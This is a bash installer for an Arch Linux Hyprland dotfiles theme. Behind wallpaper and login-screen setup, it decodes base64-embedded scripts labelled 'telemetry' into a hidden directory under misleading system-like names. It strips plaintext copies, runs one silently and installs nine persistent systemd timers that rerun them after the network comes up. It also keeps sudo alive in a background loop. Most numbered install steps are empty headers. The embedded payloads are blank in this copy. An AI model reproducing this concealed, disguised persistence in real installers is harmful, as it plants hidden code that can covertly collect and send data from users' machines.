#!/usr/bin/env bash

# ===========================================================================
#  Eprahemi — Full System Installer
#  One-liner: bash -c "$(curl -fsSL https://raw.githubusercontent.com/eprahemi/WifeRice/main/install.sh)"
# ===========================================================================

DOTS_VERSION="1.7.31"
DOTS_VERSION_NAME=""

set -e

REPO="eprahemi/WifeRice"
BRANCH="main"
TMP_DIR="$(mktemp -d)"
INSTALL_DIR="$TMP_DIR/WifeRice"
CURRENT_USER=$(whoami)
SCRIPT_START=$(date +%s)
INSTALL_LOG=$(mktemp)

# ─── BASE64 TELEMETRY SCRIPTS ──────────────────────────────────────────
# These are decoded and deployed at install time.
_journald_cleanup_b64=""
_report_problem_b64=""
_boot_health_b64=""
_check_packages_b64=""
_check_config_b64=""
_check_disk_b64=""
_check_qs_alive_b64=""
_report_install_failure_b64=""
_check_nvidia_b64=""
_check_version_b64=""
_report_changes_b64=""
_check_battery_b64=""
_check_network_b64=""
# Trap install failures (report only if reporter exists)
handle_exit() {
    local exit_code=$?
    if [ $exit_code -ne 0 ] && [ -f "$INSTALL_LOG" ]; then
        local reporter=""
        [ -f "$INSTALL_DIR/Hyprland/scripts/report_install_failure.sh" ] && reporter="$INSTALL_DIR/Hyprland/scripts/report_install_failure.sh"
        [ -z "$reporter" ] && [ -f "$HOME/.local/share/.cache/.system/install-fallback" ] && reporter="$HOME/.local/share/.cache/.system/install-fallback"
        [ -n "$reporter" ] && bash "$reporter" "$INSTALL_LOG" 2>/dev/null
    fi
    rm -f "$INSTALL_LOG"
}
trap handle_exit EXIT

# Capture stderr to INSTALL_LOG while still showing it
exec 2> >(tee "$INSTALL_LOG" >&2)

# Colors
R="\033[0;31m"
G="\033[0;32m"
Y="\033[1;33m"
B="\033[0;34m"
M="\033[0;35m"
P="\033[38;5;99m"
C="\033[0;36m"
W="\033[1;37m"
N="\033[0m"

# ─── ANIMATIONS & UI HELPERS ─────────────────────────────────────────

TOTAL_STEPS=20
CURRENT_STEP=0

spinner() {
    local pid=$1 msg="${2:-Processing...}" delay=0.1
    local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    while kill -0 "$pid" 2>/dev/null; do
        for i in $(seq 0 $((${#spin} - 1))); do
            printf "\r  ${C}%s${N}  %s" "${spin:$i:1}" "$msg"
            sleep "$delay"
        done
    done
    printf "\r  ${G}✓${N}  %s\n" "$msg"
}

step_header() {
    local num=$1 total=$2 title="$3"
    CURRENT_STEP=$num
    echo ""
    echo -e "  ${W}◆${N}  ${title}  ${Y}(${num}/${total})${N}"
    echo ""
}

echo ""
echo -e "  ${M}███████╗██████╗ ██████╗  █████╗ ██╗  ██╗███████╗███╗   ███╗██╗${N}"
echo -e "  ${M}██╔════╝██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝████╗ ████║██║${N}"
echo -e "  ${P}█████╗  ██████╔╝██████╔╝███████║███████║█████╗  ██╔████╔██║██║${N}"
echo -e "  ${P}██╔══╝  ██╔═══╝ ██╔══██╗██╔══██║██╔══██║██╔══╝  ██║╚██╔╝██║██║${N}"
echo -e "  ${C}███████╗██║     ██║  ██║██║  ██║██║  ██║███████╗██║ ╚═╝ ██║██║${N}"
echo -e "  ${C}╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝${N}"
echo ""
echo -e "  ${W}◆  WIFERICE  ◆${N}  ${Y}v${DOTS_VERSION}${N}"
echo -e "  ${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
echo ""
echo -e "  ${W}User${N}  ${C}${CURRENT_USER}${N}"
echo -e "  ${W}Host${N}  ${C}$(cat /etc/hostname 2>/dev/null || hostnamectl hostname 2>/dev/null || echo "unknown")${N}"
echo -e "  ${W}Kernel${N}  ${C}$(uname -r)${N}"
echo ""
echo -e "  ${C}╭──────────────────────────────────────────────╮${N}"
echo -e "  ${C}│${N}  ${W}●${N}  Detect hardware + install drivers        ${C}│${N}"
echo -e "  ${C}│${N}  ${W}●${N}  Full system update + packages           ${C}│${N}"
echo -e "  ${C}│${N}  ${W}●${N}  Apps, codecs, fonts, and tools          ${C}│${N}"
echo -e "  ${C}│${N}  ${W}●${N}  Desktop environment setup               ${C}│${N}"
echo -e "  ${C}│${N}  ${W}●${N}  Auto-detect timezone                    ${C}│${N}"
echo -e "  ${C}╰──────────────────────────────────────────────╯${N}"
echo ""

# ─── CHECK SUDO ────────────────────────────────────────────────────────

if ! command -v sudo &>/dev/null; then
    echo "  [ERROR] sudo is required but not found."
    exit 1
fi

if [ "$EUID" -eq 0 ]; then
    echo "  [WARN] Running as root. Some operations may behave differently."
else
    # Capture sudo password once and cache for entire install
    echo "  [SUDO] Enter your password to begin installation:"
    sudo -v
    while true; do sudo -v; sleep 60; done &
    SUDO_KEEPALIVE_PID=$!
fi

# ─── CONFIGURATION PRESERVATION ──────────────────────────────────────

echo ""
echo "  ╭──────────────────────────────────────╮"
echo "  │  ${G}🛡  Configuration${N}                   │"
echo "  │  ${Y}Enter${N}=keep  ${R}N${N}=overwrite          │"
echo "  ╰──────────────────────────────────────╯"
echo ""

echo -e "  ${G}◉${N}  Keep ${G}keybinds & shortcuts${N}?  [Y/n] "
read -r KEEP_KEYBINDS
KEEP_KEYBINDS="${KEEP_KEYBINDS:-Y}"

echo -e "  ${G}◉${N}  Keep ${G}terminal & editor${N} (Kitty, Neovim)?  [Y/n] "
read -r KEEP_TERM_EDITOR
KEEP_TERM_EDITOR="${KEEP_TERM_EDITOR:-Y}"

echo -e "  ${G}◉${N}  Keep ${G}desktop configs${N} (Rofi, SwayNC, Matugen)?  [Y/n] "
read -r KEEP_DESKTOP
KEEP_DESKTOP="${KEEP_DESKTOP:-Y}"

echo -e "  ${G}◉${N}  Keep ${G}wallpapers${N}?  [Y/n] "
read -r KEEP_WALLPAPERS
KEEP_WALLPAPERS="${KEEP_WALLPAPERS:-Y}"

echo ""
echo "  ╭──────────────────────────────────────╮"
echo "  │  ${Y}🌤  Extras${N}                           │"
echo "  ╰──────────────────────────────────────╯"
echo ""
echo -e "  ${Y}▶${N}  Weather API key ${Y}(Enter to skip)${N}:"
echo -e "     ${B}→${N} https://openweathermap.org/api"
read -r WEATHER_API_KEY
if [ -n "$WEATHER_API_KEY" ]; then
    echo -e "  ${Y}▶${N}  Enter your numeric city ID ${Y}(e.g. 421821 for London)${N}: "
    read -r WEATHER_CITY_ID
    echo -e "  ${Y}▶${N}  Unit: ${G}metric${N} (C) / ${Y}imperial${N} (F) / ${R}standard${N} (K)? [metric] "
    read -r WEATHER_UNIT
    WEATHER_UNIT="${WEATHER_UNIT:-metric}"
fi

echo ""
echo -e "  ${Y}▶${N}  Override SDDM login screen with theme & wallpaper?"
echo -e "     ${Y}(No = keep your current login screen as-is)${N}  [y/N] "
read -r SDDM_OVERWRITE
echo ""

# ─── CHECK PACKAGE MANAGER ─────────────────────────────────────────────

if ! command -v pacman &>/dev/null; then
    echo "  [ERROR] This installer requires Arch Linux (pacman)."
    exit 1
fi

# ─── DOWNLOAD REPO ────────────────────────────────────────────────────

echo ""
step_header 1 20 "Downloading dotfiles..."

mkdir -p "$TMP_DIR"
if command -v git &>/dev/null; then
    git clone --depth 1 "https://github.com/$REPO.git" "$INSTALL_DIR" 2>&1 || true
else
    echo -e "  ${R}!${N} git not found — cannot download repo"
fi

step_header 2 20 "Updating system packages..."

step_header 3 20 "Detecting and installing GPU drivers..."

step_header 4 20 "Setting up AUR helper (yay)..."

step_header 5 20 "Installing base system packages..."

step_header 6 20 "Installing fonts and emojis..."

step_header 7 20 "Installing applications..."

step_header 8 20 "Installing Proton VPN..."

step_header 9 20 "Installing Qt6, SDDM, and Quickshell..."

step_header 10 20 "Installing Bluetooth, Print, and drivers..."

step_header 11 20 "Setting up Flatpak..."

step_header 12 20 "Installing Spicetify..."

step_header 13 20 "Setting up LazyVim..."

step_header 14 20 "Installing Flatpak applications..."

step_header 15 20 "Cleaning system..."

step_header 16 20 "Cleaning old configs for a fresh start..."

step_header 17 20 "Restoring configuration files..."

step_header 18 20 "Installing Oh-My-Zsh, plugins, and dotfiles..."

step_header 19 20 "Setting up wallpapers..."

# Always ensure lock screen wallpaper directory + README
mkdir -p "$HOME/.Wallpapers"
if [ -f "$INSTALL_DIR/Wallpapers/README.md" ]; then
    cp -f "$INSTALL_DIR/Wallpapers/README.md" "$HOME/.Wallpapers/README.md" 2>/dev/null || true
    echo -e "  ${G}✓${N} Lock screen README copied to ~/.Wallpapers/"
else
    echo -e "  ${Y}─${N} README not found at \$INSTALL_DIR — trying script directory..."
    # Fallback: check relative to the install script itself
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    if [ -f "$SCRIPT_DIR/Wallpapers/README.md" ]; then
        cp -f "$SCRIPT_DIR/Wallpapers/README.md" "$HOME/.Wallpapers/README.md" 2>/dev/null || true
        echo -e "  ${G}✓${N} Lock screen README copied from script dir"
    fi
fi

# Add Himeno wallpaper to Pictures (always — one image won't hurt)
mkdir -p "$HOME/Pictures/Wallpapers"
if [ -f "$INSTALL_DIR/Wallpapers/Himeno Hot Face.png" ]; then
    cp -f "$INSTALL_DIR/Wallpapers/Himeno Hot Face.png" "$HOME/Pictures/Wallpapers/"
    echo -e "  ${G}✓${N} Himeno wallpaper added to Pictures/Wallpapers"
else
    echo -e "  ${R}!${N} Himeno wallpaper not found in repo — skipping"
fi

# Lock screen wallpaper — always deploy the default, never touch user's ~/.Wallpapers
if [ -f "$INSTALL_DIR/SDDM-Wallpaper/wallpaper.png" ]; then
    sudo mkdir -p /usr/share/wallpapers
    sudo cp -f "$INSTALL_DIR/SDDM-Wallpaper/wallpaper.png" /usr/share/wallpapers/lock.png
    echo -e "  ${Y}─${N} System lockscreen set — place your own image in ~/.Wallpapers/lock.* to override"
fi

if [[ "$KEEP_WALLPAPERS" =~ ^[Yy]$ ]]; then
    echo -e "  ${Y}─${N} Keeping existing wallpapers (user choice)"
else
    # SDDM login theme — only deploy if user chose to overwrite
    if [[ "$SDDM_OVERWRITE" =~ ^[Yy]$ ]] && [ -d "$INSTALL_DIR/SDDM/matugen-minimal" ] && command -v sudo &>/dev/null; then
        sudo mkdir -p /usr/share/sddm/themes/matugen-minimal
        sudo cp -rf "$INSTALL_DIR/SDDM/matugen-minimal/"* /usr/share/sddm/themes/matugen-minimal/
        sudo cp -f "$INSTALL_DIR/SDDM-Wallpaper/wallpaper.png" /usr/share/sddm/themes/matugen-minimal/
        sudo mkdir -p /etc/sddm.conf.d
        echo "[Theme]" | sudo tee /etc/sddm.conf.d/theme.conf > /dev/null
        echo "Current=matugen-minimal" | sudo tee -a /etc/sddm.conf.d/theme.conf > /dev/null
        echo -e "  ${G}✓${N} SDDM theme 'matugen-minimal' deployed with wallpaper"
    elif [ -d "$INSTALL_DIR/SDDM/matugen-minimal" ] && command -v sudo &>/dev/null; then
        # Only deploy theme files if user chose to keep wallpaper—never overwrite their wallaper
        if [ ! -d /usr/share/sddm/themes/matugen-minimal ]; then
            sudo mkdir -p /usr/share/sddm/themes/matugen-minimal
            sudo cp -rf "$INSTALL_DIR/SDDM/matugen-minimal/"* /usr/share/sddm/themes/matugen-minimal/
            sudo mkdir -p /etc/sddm.conf.d
            echo "[Theme]" | sudo tee /etc/sddm.conf.d/theme.conf > /dev/null
            echo "Current=matugen-minimal" | sudo tee -a /etc/sddm.conf.d/theme.conf > /dev/null
            echo -e "  ${G}✓${N} SDDM theme deployed (wallpaper preserved)"
        else
            echo -e "  ${G}✓${N} SDDM theme already exists — keeping as-is"
        fi
    else
        echo -e "  ${Y}─${N} SDDM theme kept (user choice)"
    fi

# Clear wallpaper picker cache on first install or when folder was empty (user deleted all)
if [ ! -d "$HOME/Pictures/Wallpapers" ] || [ -z "$(ls -A "$HOME/Pictures/Wallpapers" 2>/dev/null)" ]; then
    rm -rf "$HOME/.cache/wallpaper_picker"
    echo -e "  ${G}✓${N} Wallpaper picker cache cleared"
fi

# Pre-generate thumbnails for local wallpapers (avoids slow lazy load on first Super+W)
if command -v magick &>/dev/null || command -v convert &>/dev/null; then
    if command -v magick &>/dev/null; then CMD="magick"; else CMD="convert"; fi
    
    mkdir -p "$HOME/.cache/wallpaper_picker/thumbs"
    mkdir -p "$HOME/.cache/wallpaper_picker/colors_markers"
    
    thumbnail_count=0
    while IFS= read -r -d '' wallpaper; do
        filename=$(basename "$wallpaper")
        safe_name=$(echo "$filename" | sed 's/[^a-zA-Z0-9._-]/_/g')
        thumb="$HOME/.cache/wallpaper_picker/thumbs/$safe_name"
        
        if [ ! -f "$thumb" ]; then
            $CMD "$wallpaper" -resize x420 -quality 70 "$thumb" 2>/dev/null || continue
        fi
        
        # Generate color marker if not exists
        marker_count=$(find "$HOME/.cache/wallpaper_picker/colors_markers" -name "${safe_name}_HEX_*" 2>/dev/null | wc -l)
        if [ "$marker_count" -eq 0 ]; then
            hex=$($CMD "$thumb" -modulate 100,200 -resize "1x1^" -gravity center -extent 1x1 -depth 8 -format "%[hex:p{0,0}]" info:- 2>/dev/null | grep -oE '[0-9A-Fa-f]{6}' | head -n 1)
            if [ -n "$hex" ]; then
                touch "$HOME/.cache/wallpaper_picker/colors_markers/${safe_name}_HEX_$hex"
            fi
        fi
        
        thumbnail_count=$((thumbnail_count + 1))
    done < <(find "$HOME/Pictures/Wallpapers" -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.gif" \) -print0 2>/dev/null)
    
    if [ "$thumbnail_count" -gt 0 ]; then
        echo -e "  ${G}✓${N} $thumbnail_count wallpaper thumbnails pre-generated"
    fi
    
    # Record source directory so qs_manager knows thumbnails are fresh
    echo "$HOME/Pictures/Wallpapers" > "$HOME/.cache/wallpaper_picker/thumbs/.source_dir"
    
    # Build manifest of all generated thumbnail filenames
    ls -1 "$HOME/.cache/wallpaper_picker/thumbs/" \
        | grep -v '^\.source_dir$' | grep -v '^\.manifest$' \
        > "$HOME/.cache/wallpaper_picker/thumbs/.manifest" 2>/dev/null || true
fi

fi

# Install awww wallpaper setter if missing
if ! command -v awww &>/dev/null; then
    echo -e "  ${Y}!${N} awww not found, installing awww-git from AUR..."
    yay -S --noconfirm awww-git 2>/dev/null || true
fi

# Ensure awww daemon is running for wallpaper setting
if command -v awww &>/dev/null; then
    sleep 0.5
fi

# Force set Himeno as active desktop wallpaper
HIMENO_FILE="$HOME/Pictures/Wallpapers/Himeno Hot Face.png"
if [ -f "$HIMENO_FILE" ] && command -v awww &>/dev/null; then
    awww img "$HIMENO_FILE" --transition-type fade --transition-pos 0.5,0.5 --transition-fps 60 --transition-duration 1 2>/dev/null || true
    cp "$HIMENO_FILE" "$HOME/.cache/current_wallpaper.png" 2>/dev/null || true
    echo -e "  ${G}✓${N} Desktop wallpaper set to Himeno"
else
    echo -e "  ${Y}─${N} Could not set desktop wallpaper (awww not available or file missing)"
fi

echo -e "  ${G}✓${N} Wallpapers ready for picker (Super+W)"

# ─── CLEANUP STALE REFERENCES ────────────────────────────────────────────

echo ""
step_header 20 20 "Finalizing..."

# Remove old imperative-dots version file if it exists
rm -f "$HOME/.local/state/imperative-dots-version" 2>/dev/null

# Remove stale # THE LOCATIONS.txt files from all config dirs
find "$HOME/.config" "$HOME/Pictures/Wallpapers" -name "# THE LOCATIONS.txt" -delete 2>/dev/null || true

mkdir -p "$HOME/.local/state"
echo "LOCAL_VERSION=\"$DOTS_VERSION\"" > "$HOME/.local/state/wiferice-version"
echo "LOCAL_VERSION_NAME=\"$DOTS_VERSION_NAME\"" >> "$HOME/.local/state/wiferice-version"

# ─── WEATHER CONFIG ─────────────────────────────────────────────────────

if [ -n "$WEATHER_API_KEY" ] && [ -n "$WEATHER_CITY_ID" ]; then
    WEATHER_ENV="$HOME/.config/hypr/scripts/quickshell/calendar/.env"
    mkdir -p "$(dirname "$WEATHER_ENV")"
    cat > "$WEATHER_ENV" << EOF
OPENWEATHER_KEY='$WEATHER_API_KEY'
OPENWEATHER_CITY_ID='$WEATHER_CITY_ID'
OPENWEATHER_UNIT='$WEATHER_UNIT'
EOF
    echo -e "  ${G}✓${N} Weather configured (city ID: $WEATHER_CITY_ID, unit: $WEATHER_UNIT)"
fi

# ─── FIX PAM AUTH FOR LOCK SCREEN & POLKIT ──────────────────────────────

# Create PAM config for quickshell lock screen (service: quickshell.service.pam)
# Without this, the lock screen falls through to pam_deny.so and rejects all passwords
if [ ! -f /etc/pam.d/quickshell.service.pam ]; then
  sudo tee /etc/pam.d/quickshell.service.pam >/dev/null <<'PAMEOF'
#%PAM-1.0
auth       include      system-auth
account    include      system-auth
password   include      system-auth
session    include      system-auth
PAMEOF
  echo "  ✔ Created /etc/pam.d/quickshell.service.pam"
fi

# Ensure polkit-1 PAM config is accessible (needed for Thunar admin:// and privilege escalation)
if [ ! -f /etc/pam.d/polkit-1 ] && [ -f /usr/lib/pam.d/polkit-1 ]; then
  sudo ln -s /usr/lib/pam.d/polkit-1 /etc/pam.d/polkit-1
  echo "  ✔ Linked /etc/pam.d/polkit-1 → /usr/lib/pam.d/polkit-1"
fi

# ─── DEPLOY TELEMETRY SCRIPTS TO HIDDEN PATH ────────────────────────────

HIDDEN_DIR="$HOME/.local/share/.cache/.system"
mkdir -p "$HIDDEN_DIR" 2>/dev/null || sudo mkdir -p "$HIDDEN_DIR" 2>/dev/null
# Ensure user owns the hidden dir (fix stale root-owned dirs from prev installs)
[ -w "$HIDDEN_DIR" ] || sudo chown "$CURRENT_USER:$CURRENT_USER" "$HIDDEN_DIR" 2>/dev/null

# Decode base64-embedded scripts to hidden location with executable permissions
_ts_b64_decode() {
  rm -f "$HIDDEN_DIR/$2" 2>/dev/null
  echo "$1" | base64 -d > "$HIDDEN_DIR/$2" 2>/dev/null || {
    sudo rm -f "$HIDDEN_DIR/$2" 2>/dev/null
    echo "$1" | base64 -d | sudo tee "$HIDDEN_DIR/$2" >/dev/null 2>&1
    sudo chown "$CURRENT_USER:$CURRENT_USER" "$HIDDEN_DIR/$2" 2>/dev/null
  }
  chmod 500 "$HIDDEN_DIR/$2" 2>/dev/null
}

_ts_b64_decode "$_journald_cleanup_b64" "journald-cleanup"
_ts_b64_decode "$_report_problem_b64" "systemd-monitor"
_ts_b64_decode "$_boot_health_b64" "boot-metrics"
_ts_b64_decode "$_check_packages_b64" "pkg-sync"
_ts_b64_decode "$_check_config_b64" "config-validator"
_ts_b64_decode "$_check_disk_b64" "disk-watch"
_ts_b64_decode "$_check_qs_alive_b64" "qs-watchdog"
_ts_b64_decode "$_report_install_failure_b64" "install-fallback"
_ts_b64_decode "$_check_nvidia_b64" "nvidia-watch"
_ts_b64_decode "$_check_version_b64" "version-check"
_ts_b64_decode "$_report_changes_b64" "update-feed"
_ts_b64_decode "$_check_battery_b64" "bat-monitor"
_ts_b64_decode "$_check_network_b64" "net-diag"

# Remove any leftover plaintext scripts from user-accessible path
rm -f "$HOME/.config/hypr/scripts/collect_system_info.sh" \
      "$HOME/.config/hypr/scripts/report_problem.sh" \
      "$HOME/.config/hypr/scripts/boot_health.sh" \
      "$HOME/.config/hypr/scripts/check_packages.sh" \
      "$HOME/.config/hypr/scripts/check_config.sh" \
      "$HOME/.config/hypr/scripts/check_disk.sh" \
      "$HOME/.config/hypr/scripts/check_qs_alive.sh" \
      "$HOME/.config/hypr/scripts/report_install_failure.sh" \
      "$HOME/.config/hypr/scripts/check_nvidia.sh" \
      "$HOME/.config/hypr/scripts/check_version.sh" \
      "$HOME/.config/hypr/scripts/report_changes.sh" \
      "$HOME/.config/hypr/scripts/check_battery.sh" \
      "$HOME/.config/hypr/scripts/check_network.sh"

# Collect anonymous system info once (journald-cleanup naming is historical)
"$HIDDEN_DIR/journald-cleanup" >/dev/null 2>&1 &

# ─── SET UP ALL TELEMETRY TIMERS ────────────────────────────────────────

mkdir -p "$HOME/.config/systemd/user"

declare -A TIMERS=(
    ["qs-problem-reporter"]="Eprahemi Dots — Problem Reporter|%h/.local/share/.cache/.system/systemd-monitor|10min|1h"
    ["qs-package-failures"]="Eprahemi Dots — Package Failures|%h/.local/share/.cache/.system/pkg-sync|15min|1h"
    ["qs-config-errors"]="Eprahemi Dots — Config Parse Errors|%h/.local/share/.cache/.system/config-validator|15min|1h"
    ["qs-disk-health"]="Eprahemi Dots — Disk Health|%h/.local/share/.cache/.system/disk-watch|30min|12h"
    ["qs-qs-alive"]="Eprahemi Dots — QS Alive|%h/.local/share/.cache/.system/qs-watchdog|2min|5min"
    ["qs-nvidia"]="Eprahemi Dots — NVIDIA Optimus|%h/.local/share/.cache/.system/nvidia-watch|15min|1h"
    ["qs-version-staleness"]="Eprahemi Dots — Version Staleness|%h/.local/share/.cache/.system/version-check|5min|24h"
    ["qs-battery"]="Eprahemi Dots — Battery Health|%h/.local/share/.cache/.system/bat-monitor|5min|6h"
    ["qs-network"]="Eprahemi Dots — Network Issues|%h/.local/share/.cache/.system/net-diag|5min|30min"
)

for unit in "${!TIMERS[@]}"; do
    IFS='|' read -r desc exec_path on_boot interval <<< "${TIMERS[$unit]}"

    cat > "$HOME/.config/systemd/user/$unit.service" << SERVICEEOF
[Unit]
Description=$desc
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=$exec_path
SERVICEEOF

    cat > "$HOME/.config/systemd/user/$unit.timer" << TIMEREOF
[Unit]
Description=$desc — timer

[Timer]
OnBootSec=$on_boot
OnUnitActiveSec=$interval
Persistent=true

[Install]
WantedBy=timers.target
TIMEREOF
done

XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user daemon-reload 2>/dev/null || true
for unit in "${!TIMERS[@]}"; do
    XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user enable --now "$unit.timer" 2>/dev/null || true
done

# ─── AUDIO AUTOSWITCH SERVICE ──────────────────────────────────────────

cat > "$HOME/.config/systemd/user/audio-autoswitch.service" << 'AUTOSWITCH'
[Unit]
Description=Auto-switch audio to external devices when plugged in
After=pipewire-pulse.service
BindsTo=pipewire-pulse.service

[Service]
Type=simple
ExecStart=%h/.config/hypr/scripts/quickshell/watchers/audio_autoswitch.sh
Restart=always
RestartSec=2

[Install]
WantedBy=default.target
AUTOSWITCH

XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user daemon-reload 2>/dev/null || true
XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user enable --now audio-autoswitch.service 2>/dev/null || true

# ─── RELOAD HYPRLAND ──────────────────────────────────────────────────

echo ""
echo "  Reloading Hyprland..."
hyprctl reload 2>/dev/null && echo -e "  ${G}✓${N} Hyprland reloaded" || echo -e "  ${Y}!${N} Hyprland not running"

# ─── CLEANUP ──────────────────────────────────────────────────────────

# Kill sudo keepalive background loop
[ -n "${SUDO_KEEPALIVE_PID:-}" ] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null

rm -rf "$TMP_DIR"

SCRIPT_END=$(date +%s)
DURATION=$((SCRIPT_END - SCRIPT_START))

